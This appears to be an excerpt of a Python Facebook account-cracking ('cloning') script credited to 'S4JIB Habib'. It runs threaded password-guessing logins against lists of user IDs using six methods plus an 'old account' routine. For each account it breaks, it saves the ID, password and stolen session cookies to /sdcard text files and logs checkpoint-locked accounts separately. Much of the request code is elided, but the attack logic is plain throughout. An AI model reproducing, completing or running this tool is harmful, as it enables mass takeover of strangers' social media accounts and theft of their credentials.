...
#---------------------------| Logo |---------------------------#
logo=(f'''{white}        >> Code By S4JIB{green}a{white}b{green}i{white}b S4JIB <<\n{white}───────────────────────────────────────────────''')
#---------------------------| Menux |---------------------------#
def _____menux_____():
	clear()
...
def _____bd1x_____():
	...
	with tred(max_workers=30) as habibx:
		...
		for love in user:
			...
			if methd in ['1']:habibx.submit(____M1____,idf,pwv)
			if methd in ['2']:habibx.submit(____M2____,idf,pwv)
			if methd in ['3']:habibx.submit(____M3____,idf,pwv)
			if methd in ['4']:habibx.submit(____M4____,idf,pwv)
			if methd in ['5']:habibx.submit(____M5____,idf,pwv)
			if methd in ['6']:habibx.submit(____M6____,idf,pwv)
...
def _____oldx_____():
	...
	with tred(max_workers=30) as habibx:
		...
		for love in user:
			...
			habibx.submit(____old____,uid,pas,tl)
	print("");linex();print(f"{white}<|●|> Cloning Complete Brother ");print(f'{white}<|●|> Total Ok >> '+str(len(ok)));print(f'{white}<|●|> Total Cp >> '+str(len(cp)));linex();exit()
#---------------------------| Random Method 1 |---------------------------#
def ____M1____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|HABIB-M1|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
		...
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|HABIB-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/HABIB-RANDM-M1-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|HABIB-CP|> {idf} ● {pw} ")
				open('/sdcard/HABIB-RANDN-M1-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
...
def ____M2____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|HABIB-M2|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|HABIB-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/HABIB-RANDM-M2-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|HABIB-CP|> {idf} ● {pw} ")
				open('/sdcard/HABIB-RANDN-M2-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M3____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|HABIB-M3|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|HABIB-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/HABIB-RANDM-M3-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|HABIB-CP|> {idf} ● {pw} ")
				open('/sdcard/HABIB-RANDN-M3-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M4____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|HABIB-M4|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|HABIB-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/HABIB-RANDM-M4-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|HABIB-CP|> {idf} ● {pw} ")
				open('/sdcard/HABIB-RANDN-M4-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M5____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|HABIB-M5|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|HABIB-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/HABIB-RANDM-M5-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|HABIB-CP|> {idf} ● {pw} ")
				open('/sdcard/HABIB-RANDN-M5-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
...
def ____M6____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|HABIB-M6|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|HABIB-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/HABIB-RANDM-M6-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|HABIB-CP|> {idf} ● {pw} ")
				open('/sdcard/HABIB-RANDN-M6-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
...
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|HABIB-XD|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
			...
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|HABIB-CP|> {uid} ● {ps}")
				open("/sdcard/HABIB-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			elif "session_key" in po:
				print(f"\r\r{green}<|HABIB-OK|> {uid} ● {ps}")
				open("/sdcard/HABIB-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			else:pass
		loop+=1
